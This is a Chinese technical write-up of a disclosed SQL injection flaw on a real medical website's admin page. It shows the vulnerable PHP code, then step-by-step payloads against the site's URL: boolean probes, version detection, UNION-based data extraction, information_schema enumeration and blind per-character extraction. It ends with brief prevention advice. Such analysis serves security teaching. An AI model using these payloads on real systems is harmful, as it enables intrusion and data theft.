### 一般类网站攻击：SQL注入

参考：[网页攻击](https://github.com/yangshiqi/wiki/blob/master/ysq/attack/client.md)


#### 事件起源

http://www.wooyun.org/bugs/wooyun-2013-015887 披露了"盲注拿后台权限+爆库"。

研究了一下入侵的手段，还是传统的sql injection。细看代码，如下：
 
```php
public function showPublishInfo($hospitalId , $type){
        $condition = ' 1 = 1 ';
        if($hospitalId != null)
        {
                if(is_array($hospitalId))
                {
                        $hospitalId = implode(',',$hospitalId);
                        $condition .= " and hospitalid in ($hospitalId) ";
                }
                else
                {
                        $condition .= " and hospitalid = $hospitalId ";
                }
        }
        $condition .= ($type=='check') ? " and isconfirmed = 0 " : '';
        $list = $this->find_all_by_condition('OfficialPublishInfo',$condition);
        return $list ;
}
```
 
 
 
典型的没有走绑定变量的接口，而直接拼接sql语句了。扩展开来，解释一下关于sql injection问题。定义："所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令"。
通过注入可以轻松拿到网站的db，如图：

![db](https://github.com/yangshiqi/wiki/blob/master/imgs/qcon-20140beijing-xiaomi-automation.pdf)


#### sql injection原理

如这个uri：http://publish.haodf.com/admin/showpublishinfo?type=&hospitalId=1

参数是type和hospitalId，可以作为输入点进行刺探，猜测程序原理如：

```php
$id=$_GET['hospitalId'];
$sets = mysql_query('select * from xxx where hospitalid='.$id);
```

sql injection的目的是为了达到可以让mysql执行如:

select * from xxx where hospitalId=$id and xxx 的目的，"and xxx"是通过入侵者通过参数输入的。

select * from xxx where hospitalId=0; drop table xxx;，通过参数输入的"; drop table xxx;，通过参数输入的"。



##### 首次刺探 

分别尝试：

and 1=1：http://publish.haodf.com/admin/showpublishinfo?type=&hospitalId=1+and+1%3D1
and 1=2：http://publish.haodf.com/admin/showpublishinfo?type=&hospitalId=1+and+1%3D2

看到返回结果不同，证明注入成功了，因为1=2这个是不成立的，导致sql没有查出结果。sql injection刺探的一切来源，皆是此类判断。

##### 继续拿详细信息

识别使用的mysql版本范围：ord(mid(version(),1,1))>51

如：http://publish.haodf.com/admin/showpublishinfo?type=&hospitalId=1+and+ord%28mid%28version%28%29%2C1%2C1%29%29%3E51

发现返回正常页面，则说明是mysql，且版本大于4.0，支持union查询，反之是4.0以下版本或者其它类型db。

看下列数：order by N：select * from db_Hdf.officialpublishinfos where hospitalid=1 order by 2 根据列排序，逐步增加N来判断有多少列。

判断出列数后，就可以进一步利用网页展示信息来显示想要得到的数据了，假设db_Hdf.officialpublishinfos有4列，不存在hospitalid=0的数据，则：

```mysql
select * from db_Hdf.officialpublishinfos where hospitalid=0 union select 1,2,3,4
```

这样页面原本显示title，content，user，ctime的位置就显示了1，2，3，4。进而：

```mysql
select * from db_Hdf.officialpublishinfos where hospitalid=0 union select database(), version(), user(), now()
```

执行mysql命令就可以在页面中显示数据库名字，版本，用户，系统时间等敏感信息了，如：

nfs_avatar 5.5.23-log hdf@192.168.16.113 2013-01-08 15:39:54

##### 准备拿mysql的全景数据

在mysql5.0后增加了information_schema，一次性汇总了所有情况，方便拿到库，表，字段等等信息了，如：

```mysql
库：select * from information_schema.SCHEMATA
表：select * from information_schema.TABLES
列：select * from information_schema.COLUMNS
```

http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html

##### 准备拿某个表的数据

```mysql
select * from db_Hdf.officialpublishinfos where hospitalid=1
and ascii(substring((select appbooking.id from db_Hdf.appbooking order by devicetoken limit 0,1),3,1))<56
```

暴力破解。可以看到原始数据：

```mysql
select appbooking.id from db_Hdf.appbooking Order by devicetoken limit 0,1 为：838811569
```

使用来逐位破解数值：

```mysql
ascii(substring((select appbooking.id from db_Hdf.appbooking order by devicetoken limit 0,1),M,N))<A 
```

838811569，第3位是"8"，ascii(8)=56，所以当执行上述时，56是个分界点（条件是否成立）。


逐位破解时间太久？可以利用算法优化，比如简单的折半查找等。

进一步修改数据等就看运气了，是否有帐号可以执行，略过不表。
 
#### 综上所述

sql injection的大致过程如下：

1. 定位url的参数；
2. 找到可以注入的点进行刺探；
3. 判断数据库类型；
4. 根据数据库类型来取得相关的信息；
5. 拿库，表，字段，权限等信息；
6. 寻找敏感信息，比如应用的权限表，账户，密码等；
7. 修改数据，寻找其它漏洞，攻破系统，webshell等高级行为。

#### WEBSHELL 
相比较sql injection来说，webshell威力更猛，http://baike.baidu.com/view/53110.htm 相当于木马，后门

#### SQL injection防范措施 

* 绑定变量，预编译sql；
* 限制sql执行权限，不使用管理员权限帐号；